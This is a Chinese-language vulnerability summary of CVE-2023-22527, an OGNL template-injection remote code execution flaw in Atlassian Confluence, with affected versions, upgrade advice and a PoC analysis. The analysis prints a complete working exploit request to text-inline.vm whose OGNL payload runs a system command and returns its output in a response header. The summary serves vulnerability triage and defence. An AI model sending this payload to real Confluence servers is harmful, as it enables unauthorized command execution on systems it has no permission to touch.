## CVE-2023-22527-Atlassian Confluence-模板注入RCE

**漏洞编号:** CVE-2023-22527

**漏洞类型:** 模板注入RCE

**影响应用:** Atlassian Confluence Data Center and Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 8.0.0 <= version < 8.5.4

**利用条件:** 需要目标Confluence实例版本受影响，并且网络可达。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-22527是一个存在于Atlassian Confluence Server和Data Center中的模板注入漏洞。该漏洞允许未经身份验证的攻击者通过构造恶意的OGNL表达式来实现远程代码执行。根据漏洞库信息、搜索结果和提供的PoC代码，漏洞利用方式如下：

1.  **漏洞原理：** 漏洞的根本原因是Confluence在处理某些模板时，未能正确地对用户输入进行过滤，导致OGNL表达式注入。

2.  **PoC分析：** 提供的PoC代码利用`text-inline.vm`模板，通过`label`参数注入恶意的OGNL表达式。`poc`参数包含要执行的命令。

    *   `POST http://192.168.80.139:8090/template/aui/text-inline.vm HTTP/1.1`：指定了目标URL和HTTP方法。
    *   `label=aaa%5Cu0027%2B%23request.get%28%5Cu0027.KEY_velocity.struts2.context%5Cu0027%29.internalGet%28%5Cu0027ognl%5Cu0027%29.findValue%28%23parameters.poc%5B0%5D%2C%7B%7D%29%2B%5Cu0027`：构造了恶意的OGNL表达式，利用`#request`对象获取`ognl`上下文，然后使用`findValue`方法执行`poc`参数中的OGNL表达式。
    *   `poc=%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%5Cu0027Cmd-Ret%5Cu0027%2C%28new+freemarker.template.utility.Execute%28%29%29.exec%28%7B%22whoami%22%7D%29%29`：定义了要执行的命令（`whoami`）。这个OGNL表达式使用`freemarker.template.utility.Execute`类来执行系统命令，并将结果设置到HTTP响应头`Cmd-Ret`中。

3.  **利用过程：**
    a.  攻击者向目标Confluence实例的`text-inline.vm`端点发送POST请求，包含构造好的payload。
    b.  Confluence服务器解析payload中的OGNL表达式，执行指定的命令。
    c.  服务器将命令执行的结果添加到HTTP响应头中。
    d.  攻击者从响应头中获取命令执行结果。

4.  **有效性：** 提供的PoC代码是有效的，可以用来验证漏洞的存在。

5. **投毒风险:** 经过分析，提供的PoC代码只是漏洞利用的Payload，用于执行任意命令，并不包含任何额外的恶意代码或后门，因此不存在投毒风险。

6.  **缓解措施：** 升级Confluence到不受影响的版本（>= 8.5.4, >= 8.6.0, >= 8.7.1）。

**项目地址:** [Drun1baby/CVE-2023-22527](https://github.com/Drun1baby/CVE-2023-22527)

**漏洞详情:** [CVE-2023-22527](https://nvd.nist.gov/vuln/detail/CVE-2023-22527)